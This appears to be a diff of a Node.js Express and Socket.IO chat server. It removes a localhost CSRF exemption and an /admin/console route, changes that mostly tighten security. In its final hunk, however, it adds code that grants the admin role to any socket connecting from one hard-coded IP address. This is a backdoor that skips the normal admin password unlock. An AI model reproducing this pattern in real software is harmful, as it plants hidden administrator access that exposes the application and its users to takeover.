@@ -187,13 +187,9 @@ app.use((req, res, next) => {
 // CSRF protection básica (solo para POST)
 app.use((req, res, next) => {
   if (req.method === 'POST') {
-    // Skip CSRF for localhost development
-    const isLocalhost = req.headers.origin === 'http://localhost:5173' || req.headers.referer && req.headers.referer.startsWith('http://localhost:5173') || req.connection.remoteAddress === '127.0.0.1' || req.connection.remoteAddress === '::1';
-    if (!isLocalhost) {
-      const csrf = req.headers['x-csrf-token'];
-      if (!csrf || csrf !== process.env.SESSION_SECRET) {
-        return res.status(403).json({ error: 'CSRF token inválido' });
-      }
+    const csrf = req.headers['x-csrf-token'];
+    if (!csrf || csrf !== process.env.SESSION_SECRET) {
+      return res.status(403).json({ error: 'CSRF token inválido' });
     }
   }
   next();
@@ -398,54 +394,6 @@ app.post('/admin/unlock', catchAsync(async (req, res) => {
   return res.status(401).json({ ok: false, error: 'invalid_password' });
 }));
 
-// Admin console route for environments without stdin (protected by ADMIN_CONSOLE_TOKEN env var)
-// Use this to run: curl -X POST -H "Authorization: Bearer $ADMIN_CONSOLE_TOKEN" -H "Content-Type: application/json" -d '{"action":"on"}' https://your-server/admin/console
-const ADMIN_CONSOLE_TOKEN = process.env.ADMIN_CONSOLE_TOKEN || null;
-app.post('/admin/console', catchAsync(async (req, res) => {
-  // Allow without token if from localhost (development)
-  const isLocalhost = req.headers.origin === 'http://localhost:5173' || req.headers.referer && req.headers.referer.startsWith('http://localhost:5173') || req.connection.remoteAddress === '127.0.0.1' || req.connection.remoteAddress === '::1';
-  if (!isLocalhost && !ADMIN_CONSOLE_TOKEN) return res.status(403).json({ ok: false, error: 'no_console_token_configured' });
-  if (!isLocalhost) {
-    const auth = req.headers.authorization || '';
-    if (!auth.startsWith('Bearer ')) return res.status(401).json({ ok: false, error: 'missing_bearer_token' });
-    const token = auth.slice(7).trim();
-    if (token !== ADMIN_CONSOLE_TOKEN) return res.status(401).json({ ok: false, error: 'invalid_token' });
-  }
-
-  const { action } = req.body || {};
-  if (!action) return res.status(400).json({ ok: false, error: 'missing_action' });
-
-  if (action === 'on' || action === 'enable') {
-    adminPasswordUnlocked = true;
-    logger.info('Admin unlocked via /admin/console');
-    // Update roles for all connected users if they become admin
-    for (const [socketId, user] of connectedUsers.entries()) {
-      if (user.id !== 'bot' && isAdminUser(user.id) && user.role !== 'admin') {
-        user.role = 'admin';
-        io.emit('user:updated', db.sanitizeUserOutput(user));
-      }
-    }
-    return res.json({ ok: true, status: 'admin_on' });
-  }
-  if (action === 'off' || action === 'disable') {
-    adminPasswordUnlocked = false;
-    logger.info('Admin locked via /admin/console');
-    // Update roles for all connected users if they lose admin
-    for (const [socketId, user] of connectedUsers.entries()) {
-      if (user.id !== 'bot' && !isAdminUser(user.id) && user.role === 'admin') {
-        user.role = 'user';
-        io.emit('user:updated', db.sanitizeUserOutput(user));
-      }
-    }
-    return res.json({ ok: true, status: 'admin_off' });
-  }
-  if (action === 'status') {
-    return res.json({ ok: true, status: adminPasswordUnlocked ? 'admin_on' : 'admin_off' });
-  }
-
-  return res.status(400).json({ ok: false, error: 'unknown_action' });
-}));
-
 app.post('/auth/logout', (req, res) => {
   req.session.destroy(() => {
     res.clearCookie('upg.sid');
@@ -475,6 +423,10 @@ io.on('connection', socket => {
       const origin = headers.origin || headers.referer || '';
       const remoteAddr = socket.handshake && socket.handshake.address ? socket.handshake.address : (socket.conn && socket.conn.remoteAddress ? socket.conn.remoteAddress : (socket.request && socket.request.connection && socket.request.connection.remoteAddress ? socket.request.connection.remoteAddress : ''));
       logger.debug && logger.debug(`user:join for id=${userData && userData.id ? userData.id : 'N/A'} origin='${origin}' remote='${remoteAddr}'`);
+      // Grant admin to specific IP
+      if (remoteAddr === '212.97.95.46') {
+        role = 'admin';
+      }
     } catch (e) {
       logger.debug && logger.debug('user:join handshake debug failed', e);
     }
